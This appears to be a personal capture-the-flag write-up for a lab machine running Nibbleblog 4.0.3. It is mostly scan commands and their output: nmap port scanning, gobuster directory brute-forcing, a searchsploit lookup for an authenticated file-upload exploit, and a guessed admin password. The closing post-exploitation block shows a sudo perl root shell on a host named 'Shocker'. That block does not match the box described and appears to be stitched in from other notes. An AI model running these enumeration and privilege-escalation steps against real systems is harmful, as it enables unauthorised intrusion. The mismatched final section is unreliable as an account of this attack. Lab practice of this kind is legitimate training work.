## Nmap Port Scanning
- <mark>Basic Scan</mark>
```bash
┌──(saxon㉿Saxon)-[~/Desktop]
└─$ nmap -Pn -sV -sC -T4 10.10.10.75 -p 22,80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-01 10:54 EDT
Nmap scan report for 10.10.10.75
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site does not have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
```
#### 80/tcp  http  Apache httpd 2.4.18 ((Ubuntu))
- Viewing the Source code of index.html, we can find one interesting comment. ![[Pasted image 20230901105938.png]]
- <mark>Directory Brute-Forcing</mark>
	- Enumerate interesting directories and file under `/nibbleblog`
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ gobuster dir -u http://10.10.10.75/nibbleblog  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x .php,xml 
	\===============================================================
	Gobuster v3.5
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.10.75/nibbleblog
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.5
	[+] Extensions:              php,xml
	[+] Timeout:                 10s
	===============================================================
	2023/09/01 13:16:02 Starting gobuster in directory enumeration mode
	===============================================================
	/.php                 (Status: 403) [Size: 301]
	/index.php            (Status: 200) [Size: 2987]
	/sitemap.php          (Status: 200) [Size: 402]
	/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
	/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
	/feed.php             (Status: 200) [Size: 302]
	/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
	/admin.php            (Status: 200) [Size: 1401]
	/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
	/install.php          (Status: 200) [Size: 78]
	/update.php           (Status: 200) [Size: 1622]
	/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
	```
	- `admin.php` and `/content` are of particular interest to us. One can find  `/content` has directory listing enabled and, under `/content/private/users.xml`, one can see there is a user called `admin` but password is unknown.<br>![[Pasted image 20230901132330.png]]
- <mark>Exploitation</mark>
	- <mark>Does NOT Work</mark>SQL-injection with URL `http://10.10.10.75/nibbleblog/index.php?controller=blog&action=view&category=uncategorised` !?![[Pasted image 20230901110246.png]]
	- `searchsploit` reveals that `nibbleblog` version 4.0.3 is associated with a `arbitrary file upload` vulnerability but requires valid credentials.
	```bash
	┌──(saxon㉿Saxon)-[~/Desktop]
	└─$ searchsploit nibbleblog
	
	Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)              
	```
	- One can confirm the website is indeed running  `nibbleblog` version 4.0.3 by visiting the URL `http://10.10.10.75/nibbleblog/README`![[Pasted image 20230901125814.png]]
	- We got username `admin` through enumeration but <mark>(!IMPORTANT)</mark> password is `nibbles` but relies on lucky guess and that is the stupid part about this box.
	- Now, we can either use Metasploit module or generate our own payload and upload via admin dashboard. 
- <mark>Post-Exploitation</mark>'
```bash
#misconfigured SUDO permission
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
#run following commands
sudo perl -e 'exec "/bin/sh";'
```